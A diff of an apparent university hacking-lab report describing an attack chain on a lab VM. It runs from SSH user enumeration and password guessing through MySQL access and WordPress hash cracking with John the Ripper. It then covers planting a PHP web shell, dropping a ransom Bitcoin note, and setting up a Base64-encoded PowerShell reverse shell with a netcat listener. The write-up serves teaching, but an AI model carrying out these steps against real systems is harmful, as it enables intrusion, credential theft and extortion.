@@ -11,7 +11,7 @@ My project consists in the execution of some attack steps on a vulnerable machin
 Firstly, we need to find the IP address and network number of our Kali machine. To do so we open a terminal in Kali Linux and we use the “ifconfig” command. We obtain two network interfaces (fig. 1). Let’s focus on the first one. Then we need to determine which other hosts are connected to this network. We can use the “nmap” command (fig. 1) with the network number of the interface that we obtained before. We obtain 3 IP addresses (fig. 1): the first one is the default gateway, because we notice that only the TCP port is open and the third one is our Kali machine (same IP address as in ifconfig). So, the second one is the target (IP 10.0.2.4).
 
 ![fig. 1](images/fig1.png)  
-_Figure 1: _
+_fig. 1_
 
 # Initial Access
 
@@ -20,14 +20,14 @@ Now we use the exploit “use auxiliary/scanner/ssh/ssh_enumusers”, after laun
 We now open a connection to the SSH service with the command “ssh vagrant@10.0.2.4”. We insert the obtained password and we now have a SSH session, where we impersonate the user “vagrant”. By inserting the command “cmd” we get a Command Prompt.
 
 ![fig. 2](images/fig2.png)  
-_Figure 2: _
+_fig. 2_
 
 # Privilege Escalation
 
 Now we can search some text files in the target’s file system. Move to the Desktop directory with “cd”. After using the command “dir *.txt” we can see that there is a file called “password.txt”. If we read it with the command “type” we can then get the password of the Administrator account (fig.3). We can now perform Privilege Escalation by using this username and password to connect to the SSH service with the command “ssh Administrator@10.0.2.4”.
 
 ![fig. 3](images/fig3.png)  
-_Figure31: _
+_fig. 3_
 
 # Exfiltration
 
@@ -39,34 +39,34 @@ We establish again a SSH session as before impersonating the user Administrator.
 Now just construct a text file containing the address of the Bitcoin wallet, where the money of the ransom can be sent to. We put this file on the Desktop of the target machine with the command “scp /home/kali/BitcoinAddress.txt Administrator@10.0.2.4:C:/Users/Administrator/Desktop/”.
 
 ![fig. 4](images/fig4.png)  
-_Figure 4: _
+_fig. 4_
 
 # Credential Access
 
 Now let’s try to obtain the credentials of the users of WordPress, a service running on the target's webserver. Firstly, we perform online guessing on the MySQL service with the same dictionary used before for the SSH service. To do so we use the command “msfconsole -q” and then “use auxiliary/scanner/mysql/mysql_login”. Now let’s use “set RHOSTS 10.0.2.4”, “set pass_file dictionary.txt” and “set user_file dictionary.txt” as before. After running the exploit with “run”, we observe that “root” is a valid username and the password is NULL. We use the obtained username and password to connect to the MySQL service with the command “mysql --user=root --password= --host=10.0.2.4”. Now we need to steal the hashes of the passwords of the users of WordPress. We use the commands “show databases;” and “use wordpress” to access the WordPress database. We are interested in the table that contains the information of the users. To access it we use the commands “show tables;” and “describe wp_users;” (fig. 5).
 
 ![fig. 5](images/fig5.png)  
-_Figure 5: _
+_fig. 5_
 
 Now let’s retrieve the usernames and password hashes from this table with the command “select concat_ws(':', user_login, user_pass) from wp_users;”. We copy and paste them in the text file “hashes.txt” (fig. 6).
 Now we can perform offline guessing on these WordPress password hashes with John the Ripper, using the command “john --format=phpass hashes.txt --wordlist=dictionary.txt”. Here PHPass is the format of the hash for WordPress. We use the same password dictionary as before for simplicity, even if we could directly use a hash dictionary, because the passwords are not salted. Using the command “john --show hashes.txt“, we can visualize the obtained cleartext passwords of the corresponding accounts (fig. 6).
 
 ![fig. 6](images/fig6.png)  
-_Figure 6: _
+_fig. 6_
 
 # Persistance
 
-We now need to find a method to obtain persistence on the target machine. This will allow us to maintain access to the target even if the passwords of the accounts are changed. To do so, we open a browser on the Kali machine and connect to the target's webserver on port number 8585 by entering http://10.0.2.4:8585/wordpress in the URL bar. The browser will show the home page of the WordPress site hosted on the target’s webserver. Now we click on the WordPress login page. Here we insert the obtained WordPress credentials of the “admin” user. Let’s click on “Appearance” and then “Editor”. Now search for “Theme Functions” under “Themes” on the right and click on it. Here we insert the PHP code of a simple web shell (fig. 7) and we click on “Update file”. This allows us to have access to a remote Command Prompt just by connecting to the webserver with a broswer. To do that we insert “10.0.2.4:8585/wordpress/?cmd=command” in the URL bar, but instead of “command” we can write whatever command we want. It will be very difficult for the defender to notice that there is a web shell running on his webserver, because its input and output will be hidden as common HTTPS traffic.
+We now need to find a method to obtain persistence on the target machine. This will allow us to maintain access to the target even if the passwords of the accounts are changed. To do so, we open a browser on the Kali machine and connect to the target's webserver on port number 8585 by entering "10.0.2.4:8585/wordpress" in the URL bar. The browser will show the home page of the WordPress site hosted on the target’s webserver. Now we click on the WordPress login page. Here we insert the obtained WordPress credentials of the “admin” user. Let’s click on “Appearance” and then “Editor”. Now search for “Theme Functions” under “Themes” on the right and click on it. Here we insert the PHP code of a simple web shell (fig. 7) and we click on “Update file”. This allows us to have access to a remote Command Prompt just by connecting to the webserver with a broswer. To do that we insert “10.0.2.4:8585/wordpress/?cmd=command” in the URL bar, but instead of “command” we can write whatever command we want. It will be very difficult for the defender to notice that there is a web shell running on his webserver, because its input and output will be hidden as common HTTPS traffic.
 
 ![fig. 7](images/fig7.png)  
-_Figure 7: _
+_fig. 7_
 
 # Command&Control
 
 Now we can execute arbitrary commands on the target. But we don’t have an actual shell session running on the target. Moreover, the output of the arbitrary command is not visualized correctly. So, to overcome these problems and to be even more stealthy, we should execute a reverse shell on the target. The target will see this shell session as normal outbound HTTPS traffic. Firstly, we need to obtain the PowerShell script of a reverse shell from the Web (fig. 8). Inside the script we must insert the Kali machine’s IP as well as the port number (443). Let’s call this script “ReverseShell.ps1”. Then we must convert this code in Base64. This allows us to treat the script as a URL parameter. But before doing that, we create a text file “ReverseShell.txt” with the command “echo -n "powershell.exe -EncodedCommand " > ReverseShell.txt”, where we will append the script code encoded in Base64. To encode the script and then append it we use the command: “tr -d '\n' < ReverseShell.ps1 | iconv -f ASCII -t UTF-16LE | base64 -w 0 >> ReverseShell.txt”. Now we need to write this CMD command in a form that can be written in an URL. To do that we encode the command using “hURL -U -f  ReverseShell.txt“ and we copy the output. Now we need to open a server that is listening on the port number 443 on the Kali Linux machine. Just use the command “nc -nlvp 443”. Finally, we can enter “10.0.2.4:8585/wordpress/?cmd=” in the URL bar and paste the previously copied encoded CMD command after the ‘=’ sign. The target’s webserver will now act as a client and will connect to the Kali server on port number 443. We now have a CMD shell session where we can interact with the target machine. Thus, we got a Command&Control channel over HTTPS.
 
 ![fig. 8](images/fig8.png)
-_Figure 8: _
+_fig. 8_
 
 > Interesting observation: We executed all the attack steps without the need for the Administrator to physically log on the target.
 
@@ -78,18 +78,20 @@ Understanding the attacker's perspective through these simulations helps us to u
 
 Bartoli Alberto – Cybersecurity Course, Hacking Lab
 https://bartolialberto.github.io/CybersecurityCourse/Hacking%20Lab/Lab_Hacking_Metasploitable/
+
 SSH Username Enumeration - Metasploit, InfoSec Matter
 https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/ssh/ssh_enumusers
+
 SSH Login Check Scanner – Metasploit, InfoSec Matter
-[https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/ssh/ssh_login]
+https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/ssh/ssh_login
 InfoSec Matter, MySQL login
-[https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/mysql/mysql_login]
+https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/mysql/mysql_login
 Pwning WordPress Passwords, InfoSec Write-ups
-[https://infosecwriteups.com/pwning-wordpress-passwords-2caf12216956]
+https://infosecwriteups.com/pwning-wordpress-passwords-2caf12216956
 ChatGPT
-[https://chatgpt.com/]
+https://chatgpt.com/
 Simple WordPress Web Shell Tutorial (Guided Hacking), YouTube
-[https://www.youtube.com/watch?v=XHShse4z6ds]
+https://www.youtube.com/watch?v=XHShse4z6ds
 
 ### Code
 
